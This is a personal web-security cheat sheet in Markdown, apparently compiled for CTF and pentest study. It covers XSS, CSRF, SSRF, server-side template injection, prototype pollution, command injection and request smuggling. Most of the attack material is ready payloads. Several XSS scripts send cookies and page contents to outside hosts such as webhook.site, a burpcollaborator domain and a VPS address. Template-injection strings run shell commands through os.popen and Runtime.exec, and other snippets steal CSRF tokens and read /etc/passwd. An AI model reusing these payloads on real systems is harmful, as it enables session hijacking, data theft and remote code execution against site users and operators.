# +

- [javascript](./javascript.md)
- [wasm](./wasm.md)
- [fuzzing](./fuzzing.md)
- [net](./net.md)

- https://portswigger-labs.net/hackability/inspector/index.php?input=window
- [HTML Codes \- Table of ascii characters and symbols](https://ascii.cl/htmlcodes.htm)
- [Unicode/UTF\-8\-character table](https://utf8-chartable.de/unicode-utf8-table.pl)

- https://book.hacktricks.xyz/pentesting/pentesting-web
- https://github.com/swisskyrepo/PayloadsAllTheThings
- http://pentestmonkey.net/category/cheat-sheet
- https://owasp.org/www-project-web-security-testing-guide/stable/
    - https://owasp.org/www-community/attacks/
    - https://cheatsheetseries.owasp.org/Glossary.html
- https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html
- https://pentester.land/list-of-bug-bounty-writeups.html
- The Web Application Hacker's Handbook

# docs

- https://html.spec.whatwg.org/multipage/parsing.html
- https://html.spec.whatwg.org/#an-introduction-to-error-handling-and-strange-cases-in-the-parser

# labs

- https://portswigger.net/web-security
- https://pentesterlab.com/exercises
- https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/
    - https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html
    - https://hub.docker.com/r/bkimminich/juice-shop
- [IppSec \- HackTheBox Writeups](https://ippsec.rocks/)
- [Tags \| 0xdf hacks stuff](https://0xdf.gitlab.io/tags.html)

# domain names

- https://www.freenom.com/en/index.html?lang=en
- http://www.dot.tk/en/index.html?lang=en

# Information Disclosure

- [Dangling Markup \- HTML scriptless injection \- HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)
    - [Postcards from the post\-XSS world](https://lcamtuf.coredump.cx/postxss/)
- [GitHub \- cure53/HTTPLeaks: HTTPLeaks \- All possible ways, a website can leak HTTP requests](https://github.com/cure53/HTTPLeaks)

- [Webhook\.site \- Test, process and transform emails and HTTP requests](https://webhook.site/)

```python
@app.route('/', methods=['GET', 'HEAD', 'POST'])
def index():
    # e.g. Vary, Origin
    print(request.headers)
    print(request.args)
    print(json.dumps(request.json))
    return "OK"

if _name__ == "__main__":
    app.run(host='0.0.0.0', port=80, debug=True, threaded=True)
```

- robots.txt, sitemap.xml
- web server
    - e.g. nginx => `gixy /etc/nginx/nginx.conf`
        - https://github.com/8ayac/blog.8ay.ac/blob/ebc933c73dba0a5c98264cecee8c2e728dd7dad7/docs/articles/2020-03-21_LINE%20CTF%202021%20Writeup%20(%5BWeb%5D%20diveinternal%2C%20Your%20Note)%20-%20%5BEnglish%5D/index.md
    - https://github.com/w181496/Web-CTF-Cheatsheet#linux--unix
- client headers
    - https://securityheaders.com/
    - e.g. `user-agent curl/7.19.3` => vulnerable version
        - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/let_mee_see.txt
- trailing headers - sent after the content with a zero length chunk
    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Trailer
    ```bash
    curl -k -v -H 'TE: trailers' 'https://foo'
    # ||
    curl -k -v --raw 'https://foo'
    # ||
    printf 'GET / HTTP/1.1\r\nHost: www.foo.com\r\n\r\n' \
        | openssl s_client -ign_eof -connect foo.com:443 -servername www.foo.com
    ```
- page source based on login state
    - anonymous user
    - logged in user
    - admin user
- http methods
    - `nmap -p 443 --script http-methods www.example.com`
    ```
    FOO / HTTP/9.8
    HEAD / HTTP/1.0
        - e.g. page returns 302 for GET, but 200 for HEAD
    OPTIONS / HTTP/1.0
    PROPFIND / HTTP/1.0
    ```
- response status codes
    - e.g. 403 for registered users and 404 for invalid users
    - https://book.hacktricks.xyz/pentesting/pentesting-web/403-and-401-bypasses
- parameter pollution
    1. search?q=foo
    2. search?q=bar
    3. search?q=foo&q=bar (distinct result from previous cases)
    4. search?q[]=foo&q[]=bar
        - https://github.com/csivitu/CTF-Write-ups/tree/master/redpwnCTF%202020/web/tux-fanpage#tux-fanpage
        - https://gist.github.com/officialaimm/777b632be51998117e43eff71a5146f3#pasteurize
- ssl strip
    - mitigations: Strict-Transport-Security (HSTS)
        - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
- ssl weak encryption
    - https://github.com/drwetter/testssl.sh
    - https://github.com/hahwul/a2sv

- https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology
- https://medium.com/@muratkaraoz/web-app-pentest-cheat-sheet-c17394af773

### referrer

- if request host must match referrer host and must be localhost
    - then serve a filename containing `127.0.0.1`
        - https://s3.amazonaws.com/talos-intelligence-site/production/document_files/files/000/095/747/original/021522_ZTE_Vulnerability.pdf?1646670998
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
    - On typo in `Referrer-Policy: ...`, set to `unsafe-url`
        - [CTFtime\.org / justCTF \(\*\) 2020 / Computeration / Writeup](https://ctftime.org/writeup/25868)

- https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns

# Prototype Pollution

```javascript
Object.prototype.outputFunctionName = 'x;<code>;x'
```

- node-convict
- [GitHub \- msrkp/PPScan: Client Side Prototype Pollution Scanner](https://github.com/msrkp/PPScan)
- [GitHub \- BlackFan/client\-side\-prototype\-pollution: Prototype Pollution and useful Script Gadgets](https://github.com/BlackFan/client-side-prototype-pollution)
- [GitHub \- Kirill89/prototype\-pollution\-explained: Prototype Pollution in JavaScript](https://github.com/Kirill89/prototype-pollution-explained)
    - [Prototype Pollution in lodash | Snyk](https://snyk.io/vuln/SNYK-JS-LODASH-73638)
        - https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf

```html
</pre>
<script type="text/javascript">
RegExp = function() {
    return {'test' : function(){
        return true;
    }}
}
</script>
<input type="text" id="secretbox" value="nop" />
<script id="bla" src="http://challs.ctf.site:10000/safebox/file.js" type="text/javascript" onload="document.location.href='http://doma.in/?s='+document.getElementById('secretbox').value;"></script>
```

Proxy object:

```javascript
RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
          apply: function(target, thisArg, argumentsList) {
              console.log(thisArg.source);
              console.log(argumentsList[0]);
              if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){
                return false;
              }
              return Reflect.apply(target, thisArg, argumentsList)
          }
        });
        setTimeout(()=>{
            a = document.createElement("A")
            a.href="file:///Applications/Calculator.app"
            document.body.appendChild(a)
            a.click()
        }, 3000);
```
    - https://blog.redteam.pl/2020/08/rocket-chat-xss-rce-cve-2020-15926.html
    - [#276031 Remote Code Execution in Rocket.Chat Desktop - HackerOne](https://hackerone.com/reports/276031)

Clone:

- `{"name":"a","__proto__":{"country":"'$(cat flag)'"}}`
    - https://sasdf.github.io/ctf/writeup/2018/defcamp/web/chat/

# HTTP Parameter Pollution

- http://www.benhayak.com/2019/07/blog-post.html

# DOM clobbering

- https://brutelogic.com.br/blog/filter-bypass-in-multi-context/
    ```
    // breakout from tag + js
    ">'-alert(1)-'<svg>

    // https://brutelogic.com.br/blog/the-easiest-way-to-bypass-xss-mitigations/
    ">';alert(1);'<=svg>

    // breakout from json
    p="><!--
    q=--><svg onload=alert(1)>
    ```
- https://xss.pwnfunction.com/challenges/ww3/
    - https://www.anquanke.com/post/id/197614
    - http://retanoj.github.io/2020/04/18/%E9%A2%98%E7%9B%AE-XSS-2020-04-18-XSS-game-of-pwnfunction-Challenges-WW3/
    - text = `<a><style><style/><script>alert(1337);//</style><form name=notify>`

# Cross-Site Request Forgery (CSRF)

- https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery
- https://www.icir.org/vern/cs161-sp17/notes/CSRF_Paper.pdf

- Server validates that form request was sent with same CSRF token in user session
    - Extracting token: hardcoded in input / included by js
        ```html
        <img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
        ```
    - cache poisoning - avoid revoking CSRF token by triggering errors in script tag sourcing JSONP payload
        - [CTFtime\.org / SECCON 2020 Online CTF / Milk / Writeup](https://ctftime.org/writeup/24126)
        - ~/share/ctf/seccon2020/milk-solver.js
        ```
        # CORS violation (unmatched domain name, forcing apply to script tag)
        https://milk.chal.seccon.jp./note.php?_=aaaaaaaaaaaa%20crossorigin%3Duse-credentials
        # || misrecognize charset, causing syntax error
        ?_=aaaaaaaaaaaa%20charset%3Dunicodefffe
        # || misinterpret `defer` attribute as value of `aaaa` attribute, causing token callback to not be defined
        ?_=aaaaaaaaaaaa%20aaaa%3D
        # || mismatch in URI check logic to bypass added CSP header
        https://milk.chal.seccon.jp/note.php/.php
        ```
    - Mitigation: X-Frame-Options = DENY
        > The loading of "http://foo.com" in a frame is denied by "X-Frame-Options" directive set to "DENY".
- [Multiple vulnerabilities that can result in RCE · Issue \#1122 · Codiad/Codiad · GitHub](https://github.com/Codiad/Codiad/issues/1122)

### Cross-Origin Resource Sharing (CORS)

- https://book.hacktricks.xyz/pentesting-web/cors-bypass

- Origin parsing
    - https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
    - https://www.corben.io/advanced-cors-techniques/
    ```
    http://example.com%60.hackxor.net/static/cors.html
    Origin: http://example.com`.hackxor.net/
    ```

- [!] If server is down, request can fail with "Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at [...]"

# Man-In-The-Middle (MITM)

- Mitigation: Firefox: `security.mixed_content.block_active_content`

### Spread operator pollution

- e.g. skip one endpoint's check by using another endpoint without that check, using former endpoint's properties
    - [CTFtime\.org / DiceCTF 2021 / Web Utils / Writeup](https://ctftime.org/writeup/25986)
    ```javascript
    // addData: ({ uid, data, type })
    database.addData({ type: 'link', ...req.body, uid });
    
    // payload
    {"data": "javascript: fetch(`https://webhook.site/d2522a84-184e-496f-9e29-60360577d4c4?data=${encodeURIComponent(document.cookie)}`)", "type": "link"}
    ```

# Command Injection

- URL parameter
    - `file="'$(sleep 5)'a.gif`
- URL handlers
    - executable (`.desktop`, `.jar`, `.exe`...) on file share (`file:///var/run/user/<id>/gvfs/...`, `nfs://`, `webdav://`, `smb://`...)
    - `sftp://nextclouduser@<server>/example.desktop`
    - `sftp://youtube:com;watch=sn96aVA2;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/`
        - [#1078002 Nextcloud Desktop Client RCE via malicious URI schemes](https://hackerone.com/reports/1078002)
        - [Allow arbitrary URLs, expect arbitrary code execution \| Positive Security](https://positive.security/blog/url-open-rce)
- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
    - [Avoid\-Command\-Injection\-Node\.md · GitHub](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)
- https://elongl.github.io/exploitation/2021/05/30/pwning-home-router.html

### Server-Side Template Injection (SSTI)

- [Open redirect/SSRF payload generator](https://tools.intigriti.io/redirector/)

- jinja
    - [CTFtime\.org / zer0pts CTF 2020 / notepad / Writeup](https://ctftime.org/writeup/18597)
    ```
    with flask.Flask('').app_context(): flask.render_template_string("{{2+2}}")

    GET /ttttt?cmd=cat%20flag HTTP/1.1
    Host: {{url_for.__globals__.os.popen(request.args.cmd).read()}}
    Referer: http://{{url_for.__globals__.os.popen(request.args.cmd).read()}}/

    {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

    <script>
    // Payload: {{ ''.class_.__mro__[1].__subclasses__()[412]("cat server.py", shell=True, stdout=-1).communicate() }}
    fetch('http://localhost:5000/',{
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: "url=1&score=1&feedback=%7B%7B%20%27%27.__class__.__ mro__%5B1%5D.__ subclasses__%2829%5B412%5D%28%22cat%20server.py%22%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%20%7D%7D&nam=1"}).then(response => response.text()).then(data => fetch("http://demo.itmo.xyz/?nnn="+encodeURI(data)).then(response => document.write(response)));
    </script>
    ```
- freemarker
    ```java
    // https://ruvlol.medium.com/rce-in-jira-cve-2019-11581-901b845f0f
    $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://avtohanter.ru/rcetest?a=a').waitFor()

    // https://cyc10n3.medium.com/rce-via-server-side-template-injection-ad46f8e0c2ae
    ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("ls")}
    ```
- spring, thymeleaf
    ```
    // Note: Only first word returned due to space splitting
    // Reference: https://github.com/veracode-research/spring-view-manipulation/
    GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1

    // https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/
    def getClass(className):
        return "T(com.ctf.model.User).getClassLoader().loadClass("+getString(className)+")"
    poc = "${"+getClass("java.util.Arrays")+".toString("+getClass("java.nio.file.Files")+".list("+getClass("java.nio.file.Paths")+".get("+getString("/")+")).toArray()"+")}"
    poc = "<input th:value="+poc+">"
    ```
- JSP JSTL_EL
    ```
    <spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
    </spring:message>
    ```
- generic
    - https://www.zerodayinitiative.com/blog/2021/9/21/cve-2021-26084-details-on-the-recently-exploited-atlassian-confluence-ognl-injection-bug
        ```java
        // Validation
        Stream.of(Class.forName("java.lang.Runtime").getDeclaredMethods()).forEach(m -> System.out.println(m));

        "" + Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("touch /tmp/1") + "";
        "" + ((Runtime)Class.forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null)).exec("touch /tmp/1") + "";
        "" + ((Runtime)Class.forName("java.lang.Runtime").getMethod("getRuntime", (Class<?>[])null).invoke(null, (Object[])null)).exec("touch /tmp/1") + "";
        ```

- https://github.com/w181496/Web-CTF-Cheatsheet#ssti
- https://y4er.com/post/java-expression-injection/
- [Server\-Side Template Injection \| PortSwigger Research](https://portswigger.net/research/server-side-template-injection)
- [ZAP-ESUP: ZAP Efficient Scanner for Server Side Template](https://fenix.tecnico.ulisboa.pt/downloadFile/563345090416415/79039-Diogo-silva-thesis.pdf)
    - p. 51: payloads
    - p. 52: polyglot - `<#set($x<%={{={@{#{${xux}}%>)`

# Server-Side Request Forgery (SSRF)

- Headers
    - burp: Proxy > Options > Match and Replace
        - Item = Request Header
        - Match = `^X-Forwarded-For.*`
        - Replace = `X-Forwarded-For: 127.0.0.1`
- Request URL with CRLF + Headers
    - http://109.233.61.11:27280/?retpath=/news/%0d%0aX-Accel-Redirect:%20/secret/flag
        - https://www.tasteless.eu/post/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/
- Request URL parameters
    ```bash
    curl -X POST https://1.2.3.4/foo.php --data "url=http://127.0.0.1:9999"
    ```
- Request URL protocol
    - `view-source:file:///foo`
    - `javascript:window.location='attacker_host'+document.cookie`
- localhost ip octal / hexadecimal / 32bit integer / classful network encoding
    - e.g.
        ```
        127.1
        0177.0.0.1
        0000.0000.0000.0000
        ```
    - relative protocol
        - On SSL/TLS: Issue certificate to IP address
            - ./ssl.sh
            - https://nbk.sh/articles/dotless-payloads
        ```html
        <script/src=//16843009></script>
        ```
    - https://www.ultratools.com/tools/decimalCalc
    - https://ctf-wiki.github.io/ctf-wiki/web/ssrf/#bypass-posture
    - https://blog.dave.tf/post/ip-addr-parsing/
    - [AppSec EU15 \- Nicolas Gregoire \- Server\-Side Browsing Considered Harmful \- YouTube](https://www.youtube.com/watch?v=8t5-A4ASTIU)
    - Mitigation: netmask
- domain resolving to 127.0.0.1
    - `vcap.me.        86400   IN  A   127.0.0.1`
- ip overflow
    ```
    127.0.513 == 127.0.2.1
    ```
    - https://ma.ttias.be/theres-more-than-one-way-to-write-an-ip-address/
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- [PHP :: Sec Bug \#79329 :: get\_headers\(\) silently truncates after a null byte](https://bugs.php.net/bug.php?id=79329)
- https://github.com/jmdx/TLS-poison/
- https://github.com/swisskyrepo/SSRFmap

```bash
curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.0.0.1/?url=http://daffy-malleable-tote.glitch.me/go'
```
- https://glitch.com
    - https://glitch.com/edit/#!/remix/hello-express
    ```javascript
    const express = require("express");
    const app = express();

    app.get("/", (request, response) => {
      response.redirect(301, 'file:///flag.txt')
    });

    const listener = app.listen(process.env.PORT, () => {
      console.log("Your app is listening on port " + listener.address().port);
    });
    ```
- https://pipedream.com/
    - https://docs.pipedream.com/workflows/steps/code/#making-http-requests-from-your-workflow
    - Workflow = HTTP trigger > NodeJS
    ```javascript
    async(event, steps) => {
        $respond({
          status: 301,
          headers: { "Location": "file:///flag.txt" }
        });
    }
    ```
- https://www.netlify.com/blog/2018/09/13/how-to-run-express.js-apps-with-netlify-functions/
- https://devcenter.heroku.com/articles/getting-started-with-nodejs
- exposing local service
    - https://ngrok.com/
    ```bash
    # publish
    ssh exposed_host_namespace@ssh-j.com -N -R host_behind_nat:22:localhost:22
    # connect
    ssh -J exposed_host_namespace@ssh-j.com host_behind_nat
    ```

### Reverse DNS checks

- substring: ctf_host.com.127.0.0.1.attacker_domain.com
- lookup: ctf_host.com.attacker_domain.com resolves to 127.0.0.1
- request: https://ctf_host.com@127.0.0.1/foo
- host confusion
    - http://example.com:80#@ctf.ekoparty.org/
    - [PHP :: Sec Bug \#73192 :: parse\_url return wrong hostname](https://bugs.php.net/bug.php?id=73192)

### DNS Rebind

- [rbndr\.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html)
- [DnsFookup](http://rbnd.gl0.eu/dnsbin)
    - record type = A; IP = 93.184.216.34; Repeat = 1
    - record type = A; IP = 127.0.0.1; Repeat = 1

# HTTP Request Smuggling, Desync Bypass

Send request to backend bypassing frontend (e.g. proxy)

```bash
# frontend uses CL, backend uses TE
# - CL matches 2 requests
# - send 2 times, on 2nd expect "Unrecognized method GPOST"
echo -n "POST / HTTP/1.1\r\nHost: ac4d1f4a1e49785a80ae0997008b001c.web-security-academy.net\r\nCookie: session=gexP10lOiJEnEtpU7ew1ROWk8u2RS97A\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" \
    | openssl s_client -ign_eof -connect ac4d1f4a1e49785a80ae0997008b001c.web-security-academy.net:443

# frontend uses TE, backend uses CL
# - TE matches 2 requests
# - send 2 times, on 2nd expect "Unrecognized method GPOST"
# - 1st req len = 4: 2nd req len value + newline (2 chars + \r\n)
# - 2nd req len = `len(o)-7`: remove payload after 2nd request's headers (\r\n0\r\n\r\n)
echo "POST / HTTP/1.1\r\nHost: ac2b1f971e4e6d0680a69d850033000f.web-security-academy.net\r\nCookie: session=hC2vufpItiaz4fmOv5WWEqCA8yowj0iu\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n""$(python -c 'import re, sys
o = re.sub(b"\n", b"\r\n", open(sys.argv[1], "rb").read())
sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~/code/snippets/ctf/web/request_smuggling_te_cl.txt)" \
    | openssl s_client -ign_eof -connect ac2b1f971e4e6d0680a69d850033000f.web-security-academy.net:443

# Duplicated headers
~/code/snippets/ctf/web/request_smuggling_cl_cl.txt
```

- https://book.hacktricks.xyz/pentesting-web/http-request-smuggling
- https://www.imperva.com/blog/http-desync-attacks-and-defence-methods/

### Upgrade protocol

- bypass authorization controls on reverse proxies
    - [GitHub \- BishopFox/h2csmuggler: HTTP Request Smuggling over HTTP/2 Cleartext \(h2c\)](https://github.com/BishopFox/h2csmuggler)
    - [h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext \(h2c\)](https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c)
    - [H2C Smuggling in the Wild \- Assetnote](https://blog.assetnote.io/2021/03/18/h2c-smuggling/)

# Directory Traversal

- writing arbitrary files
    - [extraction path](./forensics.md#extraction-path)

- [CVE\-2021\-45467: CWP CentOS Web Panel &\#8211; preauth RCE &\#8211; Blog \| Octagon Networks](https://octagon.net/blog/2022/01/22/cve-2021-45467-cwp-centos-web-panel-preauth-rce/)
    - `.%00./`
- [Directory Traversal in st | Snyk \- Open Source Security](https://snyk.io/vuln/SNYK-JS-MINHTTPSERVER-608658)
    - https://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers
    - ~/Downloads/st-20140206_0_0_6b54ce2d2fb912eadd31e2c25c65456d2c8666e1.patch
- [Security: Fix directory traversal issue \(\#42846\) · grafana/grafana@c798c0e · GitHub](https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce#diff-2e51080c3987968b4ea97b2aa6747caced5777413ba75deca2efdcc185cc2b12L293)
    - https://news.ycombinator.com/item?id=29494394
    > 3. Eliminate each inner .. path name element (the parent directory) along with the non-.. element that precedes it.
    > 4. Eliminate .. elements that begin a rooted path: that is, replace "/.." by "/" at the beginning of a path, assuming Separator is '/'.
    > A quick reading of 3 and 4 will make you assume that a path has no ".."s after being "Clean"d. If you actually think about it more, you'll realize that of course it will leave ".." at the beginning of relative paths

# Insecure Direct Object References (IDOR)

- https://randywestergren.com/visa-gift-card-transactions-exposed-gowallet-vulnerability/
- https://www.aon.com/cyber-solutions/aon_cyber_labs/finding-more-idors-tips-and-tricks/

# Access Control

- MQTT
    - [Unauthenticated Remote Code Execution in Motorola Baby Monitors \- Randy Westergren](https://randywestergren.com/unauthenticated-remote-code-execution-in-motorola-baby-monitors/)

# Cross-Site Scripting (XSS)

- ~/code/snippets/ctf/web/injections.js
- ~/code/snippets/ctf/web/xmlrequest.js

- https://localdomain.pw/Tiny-XSS-Payloads/
- https://netsec.expert/2020/02/01/xss-in-2020.html
- https://security.stackexchange.com/questions/162436/example-of-reflected-client-xss-which-is-not-dom-based-xss

- `Range: bytes=x-y`: payload contained in interval
    - [CTFtime\.org / Google Capture The Flag 2018 \(Quals\) / bbs / Writeup](https://ctftime.org/writeup/10369)
- Same-origin policy: iframes can access each other's data in same domain
    - Loosened via CORS
    - Vulnerable to DNS Rebinding
    ```javascript
    var d = window.top.frames[0].window.document;
    ```
    - [GitHub \- galdeleon/yolovault: writeup for yolovault challenge \- 33c3 ctf](https://github.com/galdeleon/yolovault)
        - uses timeouts to wait for loaded iframe content
        - ~/code/snippets/ctf/web/yolovault/
    - cross-domain, both domains controlled: use `postMessage()`
        - https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#using_window.postmessage_in_extensions_non-standard_inline
        - https://stackoverflow.com/questions/9393532/cross-domain-iframe-issue
        ```javascript
        // framed.html
        window.onmessage = function(event) {
            event.source.postMessage(document.body.innerHTML, event.origin);
        };

        // Main page:
        window.onmessage = function(event) {
            alert(event.data);
        };

        // Trigger:
        // <iframe id="myframe" src="framed.htm"></iframe>
        document.getElementById('myframe').contentWindow.postMessage('','*');
        ```
    - X-Frame-Options
        - https://stackoverflow.com/questions/46998540/how-to-set-x-frame-options-in-express-js-node-js

DOM-Based:

- Sources: `document.url, document.referrer, location.href`
- Sinks: `element.innerHTML(), eval(), setTimeout(), document.write()`

```html
'"><img src=https://foo>

'"><script>
xmlhttp = new XMLHttpRequest();
xmlhttp.onload = function() {
    x = new XMLHttpRequest();
    x.open('GET', 'https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?' + btoa(xmlhttp.response));
    x.send(null);
    //document.write("<img src='https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?" + btoa(xmlhttp.responseText) + "'>");
}
xmlhttp.open('GET', '/admin');
xmlhttp.send(null);
</script>

<!-- Vanilla -->
nc -lvp 1000 | tee log.txt
<script> var xhr = new XMLHttpRequest(); xhr.open('GET', "http://johnhammond.org:1000/?content=" + btoa(document.body.InnerHTML), true); xhr.send(); </script>
<script>
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function() {
    document.location="http://vps_ip:23334/?"+btoa(xmlhttp.responseText);
}
xmlhttp.open("GET","http://127.0.0.1:5000/notes?name=Ann Cobb", true);
xmlhttp.send();
</script>

<!-- jQuery -->
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.js'></script><script> var x = $('body').html().toString(); $.post('http://foo/catcher.php', x); </script>

<!-- ES6 -->
<script>fetch('https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?' + btoa(document.cookie));</script>
<script>
fetch('http://localhost:5000/notes?name=Angela%20Turner').then(response => response.text()).then(
data => fetch("http://demo.itmo.xyz", {
    method: "POST",
    headers: {
        'Content-Type': 'application/json'
    },"body": JSON.stringify(data)})).then(response => document.write(response));
</script>
```

LFI:

```html
<script>
var xhr = new XMLHttpRequest;
xhr.onload = function() {
	document.write(this.responseText);
};
xhr.open("GET", "file:///etc/passwd");
xhr.send();
</script>
```

- https://github.com/snovvcrash/cheatsheets#xss
- ~/code/guides/ctf/WebBook/HTTP/XSS学习.md

Mitigations:

- [Using HTTP cookies \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Security)
    - Set-Cookie header
        - SameSite - cookie not sent via cross-origin requests
        - Secure - cookie sent strictly via https
        - HttpOnly - cookie not accessible in js
            - bypass: server-side debug info logging
            ```html
            <?php header("Set-Cookie: SESSIONID=ImAhttpOnlyCookie; path=/; httponly"); ?>
            <a href='phpinfo.php'>aa</a>
            ```
- [Content Security Policy \(CSP\) \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
    - https://csp-evaluator.withgoogle.com
    - bypass: using valid elements/attributes
        - `default-src 'self'; script-src 'self' foo.bar.com 'unsafe-inline';` => `<link rel=prefetch href=//bar.com`
        - `<script>//# sourceMappingURL=https://request/?${escape(document.cookie)}</script>`
            - [Bypass unsafe\-inline mode CSP](https://paper.seebug.org/91/)
    - [#662287 Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287)
- Checksum for requested resources (e.g. CDN .js)
    - https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity

Polyglots:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```svg
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">
    <image id="image0" width="751" height="751" x="0" y="0" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo" />
    <script>alert(1)</script>
</svg>

<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve">
  ...
  <g>
    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
    <script type="text/javascript">
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var xhr2 = new XMLHttpRequest();
          xhr2.open("POST", "http://XXXX.burpcollaborator.net/");
          xhr2.send(xhr.responseText);
        }
      }
      xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");
      xhr.withCredentials = true;
      xhr.send();
    </script>
  </g>
  ...
</svg>

<svg id="rectangle" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
    <script>alert(1)</script>
    <foreignObject width="100" height="50" requiredExtensions="http://www.w3.org/1999/xhtml">
        <embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(location)" />
    </foreignObject>
</svg>

<svg>
    <use xlink:href="data:image/svg+xml;base64,
    PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cD
    ovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhs
    aW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW
    5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+
    PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3
    JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0i
    NTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZW
    RFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8x
    OTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dH
    A6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0i
    amF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQ
    ogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle" />
</svg>
